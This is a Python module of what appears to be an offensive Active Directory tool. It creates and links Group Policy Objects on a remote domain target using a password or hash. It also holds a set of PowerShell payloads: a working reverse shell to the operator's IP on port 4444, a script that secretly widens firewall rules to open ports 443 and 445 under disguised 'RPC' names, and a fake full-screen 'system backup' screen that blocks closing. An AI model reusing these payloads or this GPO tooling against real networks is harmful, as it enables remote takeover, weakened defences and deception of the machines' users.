import subprocess
import argparse
import sys
import re
from typing import Optional, Dict
from colored import Fore
from ..Modules.utils import get_ip
from ..Modules.run_modules import execute_powershell

def get_head(name: str, oppsec: Optional[bool] = True) -> str:
    my_ip = get_ip()
    ip = "8.8.8.8" if oppsec else my_ip

    #Make disable-firewall just grab current rules and mod one to add ports
    exploit_heads = {
        "rev-shell": f"""
            $c = New-Object System.Net.Sockets.TCPClient('{my_ip}',4444);
            $s = $c.GetStream();
            [byte[]]$b = 0..65535|%{{0}};
            while(($i = $s.Read($b, 0, $b.Length)) -ne 0){{
                $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);
                $sb = (iex $d 2>&1 | Out-String );
                $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
                $s.Write($sb,0,$sb.Length);
                $s.Flush()
            }};
            $c.Close()
            """,
        "disable-firewall": f"""
            $firewall_on = (Get-NetFirewallProfile | Where-Object {{ $_.Enabled -eq $true }}).Count -gt 0
            if ($firewall_on){{
                $allRules = Get-NetFireWallRule -Direction Inbound -Enabled True | Where-Object {{
                    $pf = $_ | Get-NetFirewallPortFilter
                    $pf.Protocol -in @("TCP", "UDP") -and $pf.LocalPort -ne "Any"
                }}

                $rule_count = 2
                if ($allRules.Count -eq 1){{
                    $rule_count = 1
                }} elseif ($allRules.Count -eq 0){{
                    New-NetFirewallRule -DisplayName "RPC Endpoint Mapper" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Description "Core RPC service" -Group "Network Discovery"
                    New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service" -Group "Network Discovery"
                    return
                }}
                $randomRules = $allRules | Get-Random -Count $rule_count
                $ports = @("443", "445")

                for($i =0; $i -lt $rule_count; $i++){{
                    $rule = $randomRules[$i]
                    $portToAdd = $ports[$i]

                    $portFilter = $rule | Get-NetFirewallPortFilter
                    $newPorts = @($portFilter.LocalPort) + $portToAdd | Sort-Object -Unique

                    $portFilter | Set-NetFirewallPortFilter -LocalPort $newPorts
                    $rule | Get-NetFirewallAddressFilter | Set-NetFirewallAddressFilter -RemoteAddress Any
                }}
            }}
            """,
        "brick-machine": f"""
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing

            $form = New-Object System.Windows.Forms.Form
            $form.Text = "Critical System Backup"
            $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
            $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
            $form.TopMost = $true
            $form.BackColor = [System.Drawing.Color]::FromArgb(0, 0, 0)
            $form.ControlBox = $true

            $form.Add_KeyDown({{
                if ($_.KeyCode -eq [System.Windows.Forms.Keys]::F4 -and $_.Alt){{
                    $_.SuppressKeyPress = $true
                }}
            }})
            $form.KeyPreview = $true

            $label = New-Object System.Windows.Forms.Label
            $label.Text = "Backing up important system files, this will take just a moment..."
            $label.ForeColor = [System.Drawing.Color]::White
            $label.Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Regular)
            $label.AutoSize = $true
            $label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter

            $form.Controls.Add($label)
            $form.Add_Shown({{
                $label.Location = New-Object System.Drawing.Point(
                    [int](($form.ClientSize.Width - $label.Width) /2),
                    [int](($form.ClientSize.Height - $label.Height) /2)
                )
            }})
            $form.Show()
            [System.Windows.Forms.Application]::DoEvents()
        """,
    }   
    return exploit_heads.get(name)
    
def create_gpo(target: str, username: str, password: str, domain: str, gpo_name: str, use_hash: bool = False) -> Optional[Dict[str, str]]:
    ps_command = f'''
$ErrorActionPreference = "Stop"
try {{
    Import-Module GroupPolicy
    $gpo = New-GPO -Name "{gpo_name}"

    Write-Host "Success"
    Write-Host "GPO_NAME: $($gpo.DisplayName)"
    Write-Host "GPO_ID: $($gpo.Id)"
    Write-Host "GPO_DOMAIN: $($gpo.DomainName)"
    Write-Host "GPO_PATH: $($gpo.Path)"
}} catch {{
    Write-Host "Error"
    Write-Host "ERROR_MSG: $($_.Exception.Message)"
}}
'''
    print(f"{Fore.yellow}[*] Creating GPO: {gpo_name}")
    print(f"{Fore.yellow}[*] Target: {target} ")
    print(f"{Fore.yellow}[*] Domain: {domain}\\{username}")
    print()

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)
    if "Success" in output:
        print(f"{Fore.green}[+] GPO Created Successfully!")
        print()

        gpo_details = {}
        for line in output.split('\n'):
            if line.startswith('GPO_'):
                parts = line.split(":",1)
                if len(parts) == 2:
                    key = parts[0].replace('GPO_', '').strip()
                    value = parts[1].strip()
                    gpo_details[key] = value
                    print(f"{Fore.green} {key} {value}")
        print()
        return gpo_details

    elif "Error" in output:
        print(f"{Fore.red}[-] Failed to create GPO")
        error_match = re.search(r'ERROR_MSG: (.+)', output)
        if error_match:
            print(f"{Fore.red} Error: {error_match.group(1)}")
        return None
    else:
        print(f"{Fore.red} Something went horribly wrong when creating GPO")
        print(output)
        return None

def link_gpo(target: str, username: str, password: str, domain: str, gpo_name: str, ou_path: str, use_hash: bool = False) -> bool:
    ps_command = f'''
$ErrorActionPreference = "Stop"
try{{
    Import-Module GroupPolicy

    $link = New-GPLink -Name "{gpo_name}" -Target "{ou_path}" -LinkEnabled Yes

    Write-Host "Success"
    Write-Host "LINK_TARGET: {ou_path}"
    Write-Host "LINK_GPO: {gpo_name}"
    Write-Host "LINK_ORDER: $($link.Order)"
    Write-Host "LINK_ENABLED: $($link.Enabled)"
}} catch {{
    Write-Host "Error"
    Write-Host "ERROR_MSG: $($_.Exception.Message)"
}}
'''
    
    print(f"{Fore.yellow}[*] Linked GPO to OU")
    print(f"{Fore.yellow}[*] GPO: {gpo_name}")
    print(f"{Fore.yellow}[*] OU: {ou_path}")
    print()

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "Success" in output:
        print(f"{Fore.green}[+] GPO Linked Successfully!")
        print()

        for line in output.split('\n'):
            if line.startswith('LINK_'):
                parts = line.split(":",1)
                if len(parts) == 2:
                    key = parts[0].replace('LINK_', '').strip()
                    value = parts[1].strip()
                    print(f"{Fore.green} {key} {value}")
        print()
        return True

    else:
        print(f"{Fore.red}[-] Failed to create GPO")
        error_match = re.search(r'ERROR_MSG: (.+)', output)
        if error_match:
            print(f"{Fore.red} Error: {error_match.group(1)}")
        return False
    
def list_gpos(target: str, username: str, password: str, domain: str, use_hash: bool = False):
    ps_command = '''
$ErrorActionPreference = "Stop"
try{
    Import-Module GroupPolicy
    $gpos = Get-GPO -All | Select-Object DisplayName, Id, CreationTime, ModificationTime

    Write-Host "GPO-List"
    foreach ($gpo in $gpos){
        Write-Host "GPO|$($gpo.DisplayName)|$($gpo.Id)|$($gpo.CreationTime)|$($gpo.ModificationTime)"
    }
} catch {
    Write-Host "ERROR: $($_.Exception.Message)"
    exit 1
}
'''
    print(f"{Fore.green}[+] Listing all GPOs...")
    print()

    success, output = execute_powershell(target, username, password, domain, ps_command, use_hash)

    if "GPO-List" in output:
        gpo_lines = [line for line in output.split('\n') if 'GPO|' in line]

        if gpo_lines:
            for line in output.splitlines():
                if 'GPO|' in line:
                    clean = line[line.index('GPO|'):]
                    parts = clean.split('|')
                    if len(parts) >= 4:
                        name = parts[1][:40]
                        gpo_id = parts[2]
                        created = parts[3]
                        print(f"{name:<40} {gpo_id:<38} {created}")

        for line in output.split('\n'):
            if line.startswith('LINK_'):
                parts = line.split(":",1)
                if len(parts) == 2:
                    key = parts[0].replace('LINK_', '').strip()
                    value = parts[1].strip()
                    print(f"{Fore.green} {key} {value}")
        print()
  
def gpoHydra(username: str, password: str, use_hash: bool, target: str, domain: str, action: str, ou: Optional[str] = None, name: Optional[str] = None) -> None:
    if action == 'create':
        gpo_details = create_gpo(target, username, password, domain, name, use_hash)
        if gpo_details and ou:
            print()
            link_gpo(target, username, password, domain, name, ou, use_hash)
    elif action == 'link':
        link_gpo(target, username, password, domain, name, ou, use_hash)
    elif action == 'list':
        list_gpos(target, username, password, domain, use_hash)

